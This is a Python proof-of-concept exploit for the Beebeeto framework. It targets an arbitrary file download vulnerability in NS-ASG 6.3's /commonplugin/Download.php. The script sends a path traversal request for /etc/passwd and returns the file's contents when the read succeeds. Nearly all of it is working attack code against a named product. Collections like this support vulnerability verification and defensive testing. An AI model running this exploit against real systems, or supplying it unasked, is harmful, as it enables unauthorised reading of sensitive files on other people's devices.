#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0039',
            'name': '网康科技 NS-ASG 6.3 /commonplugin/Download.php 任意文件下载漏洞 Exploit',
            'author': 'foundu',
            'create_date': '2015-02-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'NS-ASG',
            'vul_version': '6.3',
            'type': 'Arbitrary File Download',
            'tag': ['网康科技 NS-ASG 漏洞', '任意文件下载漏洞', '/commonplugin/Download.php', 'php'],
            'desc': 'N/A',
            'references': ['http://wooyun.org/bugs/wooyun-2015-097832',
            ]
        },
    }


    @classmethod
    def exploit(cls, args):
        payload = '/commonplugin/Download.php?reqfile=../../../../etc/passwd'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'root:' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['passwd'] = content
        return args


    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())